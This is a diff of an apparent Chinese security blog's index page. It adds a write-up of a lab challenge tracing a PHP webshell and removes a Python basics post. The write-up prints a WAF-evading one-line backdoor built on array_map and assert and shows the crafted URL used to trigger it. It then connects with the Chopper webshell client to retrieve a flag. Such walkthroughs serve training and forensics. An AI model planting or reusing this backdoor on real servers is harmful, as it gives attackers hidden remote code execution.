@@ -211,6 +211,82 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-墨者WebShell代码分析溯源(第6题)" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/03/墨者WebShell代码分析溯源(第6题)/" class="article-date">
+  	<time datetime="2019-04-03T05:59:10.000Z" itemprop="datePublished">2019-04-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/03/墨者WebShell代码分析溯源(第6题)/">
+        墨者WebShell代码分析溯源(第6题)
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>过狗过盾无特征无动态函数PHP一句话</p>
+<p>原理：<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>进入漏洞之后，发现一个<strong>下载系统源码</strong>，下载之后发现在<strong>www_bak\Assets\upload\</strong>目录有一个<strong>pic3.jpg.php</strong>，很明显是黑客上传上去生成一句话木马的文件，打开之后如下图所示：<br><img src="https://i.loli.net/2019/04/03/5ca44da94909b.jpg" alt=""></p>
+<blockquote>
+<p>array_map函数： 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p>
+</blockquote>
+<p>分析上述代码，可以发现黑客上传的密码<strong>POST</strong>，并发现array_map回调函数，这段代码就相当于base64_decode($_REQUEST[‘e’])($_POST[‘POST’])，array_map的第一个参数需要是回调函数，所以这个后门：<br><strong>array_map(assert,(array)base64_decode($_REQUEST[‘POST’]));</strong>array_map第二个参数需要再镶嵌一个assert。</p>
+<h2 id="构造url"><a href="#构造url" class="headerlink" title="构造url"></a>构造url</h2><p>构造url就比较简单了，直接<strong>ip+上传目录+参数</strong>，构造好后就是：<br><a href="http://219.153.49.228:48515/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0" target="_blank" rel="noopener">http://219.153.49.228:48515/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0</a></p>
+<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>构造完成url，直接菜刀连接，如下图：<br><img src="https://i.loli.net/2019/04/03/5ca47743b44a4.jpg" alt=""><br>成功连接，找到key<br><img src="https://i.loli.net/2019/04/03/5ca477969aa2e.jpg" alt=""><br><img src="https://i.loli.net/2019/04/03/5ca477c7471d4.jpg" alt=""></p>
+<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+	</div>
+
+      
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2019/04/03/墨者WebShell代码分析溯源(第6题)/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="墨者WebShell代码分析溯源(第6题)">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-DVWA（文件上传篇）" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
@@ -984,73 +1060,6 @@ if (isset($_POST[&apos;Upload&apos;])) {
         
 <div class="counter-tag counter">
     <span id="/2019/02/14/python基本语法/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="python基础">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-交互模式与脚本模式" class="article article-type-post" itemscope="" itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/02/05/交互模式与脚本模式/" class="article-date">
-  	<time datetime="2019-02-05T06:21:19.000Z" itemprop="datePublished">2019-02-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/05/交互模式与脚本模式/">
-        python的交互式编程与脚本式编程
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="交互式编程"><a href="#交互式编程" class="headerlink" title="交互式编程"></a>交互式编程</h1><p>交互式编程不需要创建脚本文件，是通过 Python 解释器的交互模式进来编写代码。</p>
-<p>linux上你只需要在命令行中输入 Python 命令即可启动交互式编程。<br>我用的是Windows系统，Windows上需要到python官网上下载编译器，然后在PATH变量中添加python，python建议大家都用python3，因为以后可能python2就不会再更新了，所以希望大家用python3。在设置好这些之后你就可以在cmd.exe中输入python，可以得到以下界面：<br><img src="https://i.loli.net/2019/02/21/5c6e08ed6a562.png" alt=""><br>出现这个页面，说明你已经进入了python的交互模式，在这里面你可以看到自己所使用python的版本，也可以进行简单的四则运算，python的基本语法，输入输出。<br><strong>例如输出简单的hello world</strong>：你可以输入print (‘hello world’)<br><img src="https://i.loli.net/2019/02/21/5c6e0a7032d27.png" alt=""><br>就可以得到想要的结果。</p>
-<h1 id="脚本式编程"><a href="#脚本式编程" class="headerlink" title="脚本式编程"></a>脚本式编程</h1><p>通过脚本参数调用解释器开始执行脚本，直到脚本执行完毕。当脚本执行完成后，解释器不再有效。</p>
-<p>让我们写一个简单的 Python 脚本程序。所有 Python 文件将以 .py 为扩展名。我们可以用python自带的idle编译器进行编辑，如下图所示：<br><img src="https://i.loli.net/2019/02/21/5c6e0cc9e7010.png" alt=""><br>就输出了简单hello world。</p>
-<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2019/02/05/交互模式与脚本模式/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="python的交互式编程与脚本式编程">
          &nbsp;
         view
     </span>
